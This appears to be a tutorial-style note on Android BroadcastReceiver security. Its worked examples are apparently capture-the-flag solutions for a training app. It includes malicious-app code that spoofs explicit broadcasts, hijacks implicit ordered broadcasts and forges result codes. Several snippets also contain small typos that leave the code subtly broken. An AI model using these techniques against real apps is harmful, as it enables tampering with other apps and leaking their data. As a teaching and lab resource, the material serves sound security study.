---
title: "Broadcast Receivers"
---

> **Note**: this section requires a full understanding of [Intent attack surface](intent attack surface.html).

## Introduction

A **[Broadcast Receiver](https://developer.android.com/develop/background-work/background-tasks/broadcasts)** is a core component that allows your app to listen for system-wide broadcast announcements (called broadcast intents) or broadcasts sent by other applications or even your own application.

Apps can register to receive specific broadcasts. When a broadcast is sent, the system automatically routes broadcasts to apps that have subscribed to receive that particular type of broadcast.

Basically, broadcasts can be used as a messaging system across apps and outside of the normal user flow.

Broadcast Receivers don’t display a user interface. Instead, they respond to broadcasted events by performing some logic. For example: starting a service, showing a notification, logging data, etc.

### Declaring a broadcast receiver

You can register a receiver in **two ways**:

1. **Static Registration** (Manifest)

* The receiver is declared in the `AndroidManifest.xml` file using the `<receiver>` tag.
* It can receive broadcasts even when your app is not running (e.g., listening for `ACTION_BOOT_COMPLETED`).

```xml
<receiver android:name=".MyBootReceiver"
          android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

The class `MyBootReceiver` extends `BroadcastReceiver` and it overrides the `onReceive (Context context, Intent intent)` method.

From the attacker perspective this is interesting because the incoming intent is potentially controlled by an attacker.

2. **Dynamic Registration** (Runtime)

Registered at runtime by using `registerReceiver()` and this works only while the app is running.

```java
val receiver = MyReceiver()
val filter = IntentFilter(Intent.ACTION_BATTERY_LOW)
registerReceiver(receiver, filter)
```

In this case, if the system sends this broadcast intent, then the class `receiver` is used as the receiver and it'll execute the code in the `onReceive()` method.

### Send broadcasts

Android provides two ways for apps to send broadcasts \[[↗](https://developer.android.com/develop/background-work/background-tasks/broadcasts#sending-broadcasts)]:

* The `sendOrderedBroadcast()` method sends broadcasts to one receiver at a time. As each receiver executes in turn, **it can propagate a result to the next receiver**. It can also completely abort the broadcast so that it doesn't reach other receivers. You can control the order in which receivers run within the same app process. To do so, use the `android:priority` attribute of the matching `intent-filter`. Receivers with the same priority are run in an arbitrary order.
* The `sendBroadcast()` method sends broadcasts to all receivers in an undefined order. This is called a Normal Broadcast. This is more efficient, but means that **receivers cannot read results** from other receivers, propagate data received from the broadcast, or abort the broadcast.

### Broadcast limitations

From Android 8 (API level 26) the delivery of implicit broadcasts to apps is [restricted](https://developer.android.com/about/versions/oreo/background#broadcasts). This is because the system generally wants to avoid broadcast receivers that could be called when the app is not even running. So you **have to specify the target**. As with any general rule, there are [exceptions](https://developer.android.com/develop/background-work/background-tasks/broadcasts/broadcast-exceptions) to this behavior. In fact, several broadcasts are exempt from these limitations.

### System event broadcasts

Android defines many system broadcast actions, such as `BOOT_COMPLETED` and `POWER_CONNECTED`. Attempting to send a protected system broadcast fails with a `SecurityException`, for example: `permission denial: not allowed to send broadcast action POWER_CONNECTED`. This restriction applies to both implicit and explicit intents. Even when the target app and receiver class are specified explicitly, the system blocks the broadcast because only the system is allowed to send these actions. As a result, protected broadcast actions cannot be spoofed.

However, this does not automatically make the receiver safe. Since an attacker cannot set the protected action value, the receiver’s code cannot enter branches that explicitly check for it. If the receiver contains alternative code paths that do not validate the action, those paths may still be reachable through an explicit broadcast with a custom action.

Malicious app:

```java
Intent intent = new Intent();
intent.setAction("test");
intent.setClassName("com.app.test", "com.app.test.TestReceiver");
sendBroadcast(intent);
```

Target app:

```xml
<receiver android:name:"com.app.test.TestReceiver" android:exported="true">
    <intent-filter>
        <action android=name="android.intent.action.ACTION_POWER_CONNECTED"/>
    </intent-filter>
</receiver>
```

```java
public void onReceive(Context context, Intent intent) {
    String action = intent.getAction();
    if ("android.intent.action.ACTION_POWER_CONNECTED".equals(action)) {
        ...
    } else {
        // We can execute this code!
    }
}
```

In the example above, the if branch is protected because the system action cannot be forged. The else branch, however, is reachable if an explicit intent with a different action is sent, allowing unintended behavior to be triggered.

The key takeaway is that while protected system broadcasts themselves cannot be forged, BroadcastReceivers that do not strictly validate incoming intents may still expose an attack surface.

---

## Sending broadcast from malicious app

Let's say that the app `io.hextree.attacksurface` has the following `BroadcastReceiver`:

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag16Receiver"
    android:enabled="true"
    android:exported="true"/>
```

```java
public class Flag16Receiver extends BroadcastReceiver {
    public static String FlagSecret = "give-flag-16";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("Flag16Receiver.onReceive", Utils.dumpIntent(context, intent));
        if (intent.getStringExtra("flag").equals(FlagSecret)) {
            success(context, FlagSecret);
        }
    }

    private void success(Context context, String str) {...}
}
```

You can just send a broadcast as follow:

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
intent.putExtra("flag", "give-flag-16");
sendBroadcast(intent);
```

---

## Vulnerabilities

### Broadcast redirect

A broadcast redirect occurs when an insecure activity takes an incoming intent, performs some actions/modifications, and then sends the intent via `sendBroadcast()`. This allows an attacker to control the broadcast intent. For example, this could target internal, non-exported broadcast receivers.

```java
public class ExposedActivity extends AppCompatActivity {

    @override
    protected void onCreate (...) {
        ...
        Intent intent = getIntent();
        intent.setClassName("com.example.myapp", "com.example.myapp.InternalReceiver");
        sendBroadcast(intent); // This intent could be controlled by the attacker
    }
}

```

For more information, refer to [Intent attack surface - Intent redirect](intent%20attack%20surface.html#intent-redirect).

### Intercept implicit intents

This is when the an app sends an implicit intent broadcast so a malicious app can register a receiver to be a valid target for the implicit intent.

1. Identify an app that sends implicit broadcast, e.g. `application.Context.sendBroadcast(new Intent(SPAReceiver.ACTION_SP_APPS_QUERY_FEEDS))`.
2. Use the dynamic registered receivers in your activity. This means the app must be already running.

```java
BoradcastReceiver receiver = new hijackReceiver();
registerReceiver(receiver, new IntentFilter("com.example.app.intent.SP_APPS_QUERY_FEEDS"))
```

> **Note**: if you create a new receiver in your app and expose this in the `AndroidManifest.xml`, it probably will not receive an implicit broadcast due to the battery impact of background tasks that we are talked about before.

**Example**

Let’s say that the app io.hextree.attacksurface has the following activity:

```java
public class Flag18Activity extends AppCompactActivity {
    public Flag18Activity() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Intent intent = new Intent("io.hextree.broadcast.FREE_FLAG");
        intent.putExtra("flag", this.f182f.appendLog(this.flag));
        intent.addFlags(8);
        sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent2) {
                String resultData = getResultData();
                Bundle resultExtras = getResultExtras(false);
                int resultCode = getResultCode();
                Log.i("Flag18Activity.BroadcastReceiver", "resultData " + resultData);
                Log.i("Flag18Activity.BroadcastReceiver", "resultExtras " + resultExtras);
                Log.i("Flag18Activity.BroadcastReceiver", "resultCode " + resultCode);
                if (resultCode != 0) {
                    flag18Activity.success(flag18Activity);
                }
            }
        }, null, 0, null, null);
    }
}
```

To intercept this intent I have to register a receiver and send `resultCode != 0`:

```java
BroadcastReceiver hijackReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        setResultCode(RESULT_OK); // Costant value for -1
    }
};
registerReceiver(hijackReceiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
```

### Control the results

Similar to activities, a broadcast can return results back to the sender with `sendOrderedBroadcast()`. This method takes in another BroadcastReceiver object which will handle the result returned back.

If a malicious app receives such a broadcast, they can return attacker controlled values.

```java
BroadcastReceiver resultReceiver = new BroadcastReceiver() {
    @override
    public void onReceive(Context context, Intent intet) {
        String resultData = getResultData();
        Bundle resultExtras = gerResultExtras(false);
        int resultCode = getResultCode();
        // attacker controlled intent
    }
}

sendOrderedBroadcast(intent, null, resultReceiver, null, RESULT_CANCELED, null, null);
```

**Example**

Let’s say that the app io.hextree.attacksurface has the following BroadcastReceiver:

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag17Receiver"
    android:enabled="true"
    android:exported="true"/>
```

```java
public class Flag17Receiver extends BroadcastReceiver {
    public static String FlagSecret = "give-flag-17";

    @Override 
    public void onReceive(Context context, Intent intent) {
        Log.i("Flag17Receiver.onReceive", Utils.dumpIntent(context, intent));
        if (isOrderedBroadcast()) {
            if (intent.getStringExtra("flag").equals(FlagSecret)) {
                success(context, FlagSecret);
                return;
            }
            Bundle bundle = new Bundle();
            bundle.putBoolean("success", false);
            setResult(0, "Flag 17 Completed", bundle);
        }
    }

    private void success(Context context, String str) {
        Flag17Activity flag17Activity = new Flag17Activity();
        flag17Activity.f182f = new LogHelper(context);
        flag17Activity.f182f.addTag(str);
        flag17Activity.success(null, context);
        Bundle bundle = new Bundle();
        bundle.putBoolean("success", true);
        bundle.putString("flag", flag17Activity.f182f.appendLog(flag17Activity.flag));
        setResult(-1, "Flag 17 Completed", bundle);
    }
}
```

To intercept this intent I have to send a broadcast and analyze the results:

```java
Intent intent = new Intent();
intent.putExtra("flag", "give-flag-17");
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");
sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle result = getResultExtras(true);
        if (result != null && result.getBoolean("success")) {
            Log.d("Flag: ",result.getString("flag"));
        }

    }}
    , null, 0, null, null);
```